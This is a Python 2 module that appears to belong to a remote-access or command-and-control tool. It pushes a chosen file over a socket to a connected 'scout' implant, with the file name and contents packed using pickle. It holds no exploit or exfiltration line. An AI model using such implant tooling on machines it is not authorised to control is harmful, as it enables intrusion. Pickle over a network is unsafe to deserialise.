import library.modules.recv_all as recv_all
import time
import pickle
from ntpath import basename

def main(sock,filepath):
    try:
        filepath = filepath.split(' ',1)[1]
        print '[*]Reading file...'
        f = open(filepath,'rb')
        print '[*]Initiating file upload with scout...'
        sock.sendall('upload')
        time.sleep(3)
        data = f.read()
        f.close()
        pickle_data = pickle.dumps([basename(filepath),data])
        print '[+]Done, uploading file...'
        sock.sendall(pickle_data)
        response = recv_all.main(sock)
        print response
    except IOError:
        print '[-]File does not exist, cannot upload'
    except IndexError:
        print '[-]Please supply valid arguments for the command you are running'
    except Exception as e:
        print '[-]Error while uploading file : ' + str(e)
